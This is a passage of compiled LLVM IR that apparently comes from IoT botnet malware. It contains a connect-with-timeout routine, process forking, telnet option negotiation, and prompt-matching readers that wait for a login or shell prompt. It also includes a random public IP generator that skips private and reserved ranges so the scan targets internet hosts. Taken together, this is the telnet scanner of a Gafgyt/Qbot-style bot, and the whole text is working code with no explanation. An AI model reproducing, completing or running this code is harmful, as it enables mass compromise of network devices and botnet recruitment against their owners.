  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !3
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #2
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %136, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %137

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #2, !srcloc !4
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 64
  %63 = zext i32 %62 to i64
  %64 = shl i64 1, %63
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %66 = load i32, i32* %10, align 4
  %67 = sdiv i32 %66, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %70, %64
  store i64 %71, i64* %69, align 8
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %60
  br label %137

; <label>:77:                                     ; preds = %60
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %18, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8* %81, i8** %23, align 8
  %82 = load i32, i32* %10, align 4
  %83 = load i8*, i8** %23, align 8
  %84 = call i64 @recv(i32 %82, i8* %83, i64 1, i32 0)
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %19, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %77
  %89 = load i32, i32* %19, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %88, %77
  store i32 0, i32* %9, align 4
  br label %142

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %19, align 4
  %94 = load i32, i32* %18, align 4
  %95 = add nsw i32 %94, %93
  store i32 %95, i32* %18, align 4
  %96 = load i8*, i8** %23, align 8
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 255
  br i1 %99, label %100, label %122

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i64 @recv(i32 %101, i8* %103, i64 2, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %100
  store i32 0, i32* %9, align 4
  br label %142

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, %113
  store i32 %115, i32* %18, align 4
  %116 = load i32, i32* %10, align 4
  %117 = load i8*, i8** %23, align 8
  %118 = call i32 @negotiate(i32 %116, i8* %117, i32 3)
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %121, label %120

; <label>:120:                                    ; preds = %112
  store i32 0, i32* %9, align 4
  br label %142

; <label>:121:                                    ; preds = %112
  br label %136

; <label>:122:                                    ; preds = %92
  %123 = load i8*, i8** %15, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i8* @strstr(i8* %123, i8* %124) #10
  %126 = icmp ne i8* %125, null
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %12, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %15, align 8
  %132 = call i32 @matchPrompt(i8* %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %122
  store i32 1, i32* %20, align 4
  br label %137

; <label>:135:                                    ; preds = %130, %127
  br label %136

; <label>:136:                                    ; preds = %135, %121
  br label %33

; <label>:137:                                    ; preds = %134, %76, %48
  %138 = load i32, i32* %20, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %9, align 4
  br label %142

; <label>:141:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %140, %120, %111, %91
  %143 = load i32, i32* %9, align 4
  ret i32 %143
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %27

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %27

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = add i8 %12, 1
  store i8 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %14 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 16, i32 16, i1 false)
  %15 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %17 = zext i8 %16 to i32
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %23 = zext i8 %22 to i32
  %24 = call i32 (i8*, i8*, ...) @szprintf(i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i32 0, i32 0), i32 %17, i32 %19, i32 %21, i32 %23)
  %25 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %26 = call i32 @inet_addr(i8* %25) #2
  store i32 %26, i32* %1, align 4
  br label %177

; <label>:27:                                     ; preds = %7, %0
  %28 = call i32 @rand() #2
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %31 = call i32 @rand() #2
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %34 = call i32 @rand() #2
  %35 = srem i32 %34, 255
  %36 = trunc i32 %35 to i8
  store i8 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %37

; <label>:37:                                     ; preds = %155, %27
  %38 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %153, label %41

; <label>:41:                                     ; preds = %37
  %42 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 10
  br i1 %44, label %153, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 100
  br i1 %48, label %49, label %57

; <label>:49:                                     ; preds = %45
  %50 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp sge i32 %51, 64
  br i1 %52, label %53, label %57

; <label>:53:                                     ; preds = %49
  %54 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %55 = zext i8 %54 to i32
  %56 = icmp sle i32 %55, 127
  br i1 %56, label %153, label %57

; <label>:57:                                     ; preds = %53, %49, %45
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 127
  br i1 %60, label %153, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 169
  br i1 %64, label %65, label %69

; <label>:65:                                     ; preds = %61
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 254
  br i1 %68, label %153, label %69

; <label>:69:                                     ; preds = %65, %61
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 172
  br i1 %72, label %73, label %81

; <label>:73:                                     ; preds = %69
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp sle i32 %75, 16
  br i1 %76, label %77, label %81

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 31
  br i1 %80, label %153, label %81

; <label>:81:                                     ; preds = %77, %73, %69
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 192
  br i1 %84, label %85, label %93

; <label>:85:                                     ; preds = %81
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %93

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 2
  br i1 %92, label %153, label %93

; <label>:93:                                     ; preds = %89, %85, %81
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 192
  br i1 %96, label %97, label %105

; <label>:97:                                     ; preds = %93
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 88
  br i1 %100, label %101, label %105

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %153, label %105

; <label>:105:                                    ; preds = %101, %97, %93
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 192
  br i1 %108, label %109, label %113

; <label>:109:                                    ; preds = %105
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 168
  br i1 %112, label %153, label %113

